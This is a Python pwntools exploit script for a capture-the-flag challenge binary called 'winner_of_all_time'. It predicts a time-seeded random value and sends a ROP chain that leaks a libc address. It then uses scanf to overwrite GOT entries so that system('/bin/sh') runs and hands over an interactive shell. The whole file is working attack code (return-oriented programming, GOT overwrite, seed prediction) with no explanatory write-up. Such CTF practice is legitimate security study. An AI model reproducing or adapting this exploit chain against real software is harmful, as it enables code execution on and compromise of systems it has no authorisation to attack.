from pwn import *
import sys
from ctypes import CDLL
import math

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "INFO"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./winner_of_all_time"        ### CHANGE ME !!!!!!!!!!!!!!!!
libc = ELF("./libc.so.6")

# for getting time
# for getting the random
# getting the immuled shit
#b *0x401643
gdbscript = '''
    b * 0x4016df
    b system
    c
'''
# no control
#0x7ffe618e19c8
# 0x7ffe618e1a00
# 0x7ffe618e1a78

def init():
    ## loading custom libc
    env = {"LD_LIBRARY_PATH": "/home/lhorbax/ctf/2023/wannagame/pwn/winner_of_all_time/libc.so.6"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote("localhost", 13337)
        #157.245.147.89 
    else :
        pp = process(binary, env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit(pp):
    ### notes 
    ## main function : 0x40159d
    # fucking rip off 25
    # address of the buffer $RBP - 0xb0
    # x/75i 0x40159d
    # timelineptr = 0x4040d2

    libc = CDLL("/home/lhorbax/ctf/2023/wannagame/pwn/winner_of_all_time/libc.so.6")
    ctime = int(math.floor(time.time()))
    libc.srand(ctime)
    secret_timeline = libc.rand() % 123456789

    # sending some data to get to the right offset
    for i in range(0, 23):
        pp.recv()
        pp.sendline(str(0x4141).encode("utf-8"))

    pop_rsi_pop_rfiv = 0x401596
    pop_rdi = 0x401589
    timelinevaraddr = 0x4040D8
    main = 0x40159d
    scanf = elf.plt.__isoc99_scanf
    ret = pop_rdi+1 
    ropchain = [ 
            # leaking libc address
            pop_rdi, elf.got.puts, elf.plt.puts, ret,
            
            # calling scanf to make the timeline var 0
            pop_rdi, next(elf.search(b"%lld")) , pop_rsi_pop_rfiv, timelinevaraddr, 0, scanf,

            0x0000000000401585,
            # now calling main
            main
            ]

    log.warn("injecting the rop chain")
    for x in ropchain:
        pp.recv()
        pp.sendline(str(x).encode("utf-8"))

    log.warn("exiting from the all timelines [dying]")
    pp.recvuntil(b"]: ")
    pp.sendline(str(secret_timeline).encode("utf-8"))
    pp.recvuntil(b"time\n")
    leaked_baser = pp.recvuntil(b"\n")[:-1]
    leaked_base = unpack(leaked_baser + ((8 -len(leaked_baser))  * b"\x00"))
    log.success(f"leaked puts {hex(leaked_base)}")

    ## writing to the timeline 
    pp.sendline(b"0")

    ctime = int(math.floor(time.time()))
    libc.srand(ctime)
    secret_timeline = libc.rand() % 123456789

    for i in range(0, 23):
        pp.recv()
        pp.sendline(str(i).encode("utf-8"))

    elibc.address = leaked_base - elibc.sym.puts
    log.warn(f"system {hex(elibc.sym.system)}")
    final_rop_chain = [
        pop_rdi, next(elf.search(b"%lld")) , pop_rsi_pop_rfiv, elf.got.rand, 0, scanf,
        pop_rdi, next(elf.search(b"%lld")) , pop_rsi_pop_rfiv, elf.got.srand, 0, scanf,
        ret, pop_rdi, elf.got.srand, elf.plt.rand
            ]

    log.warn("injecting the rop chain")
    for x in final_rop_chain:
        pp.recv()
        pp.sendline(str(x).encode("utf-8"))

    pp.recv()
    pp.sendline(str(secret_timeline).encode("utf-8"))

    pp.sendline(str(elibc.sym.system).encode("utf-8"))
    pp.sendline(str(u64(b"/bin/sh\0")).encode())

    # checking
    pp.interactive()

elf = context.binary = ELF(binary)
# elibc = ELF("/usr/lib/libc.so.6")
elibc = ELF("./libc.so.6")
pp = init()

log.info("Getting the random timeline to return")
exploit(pp)
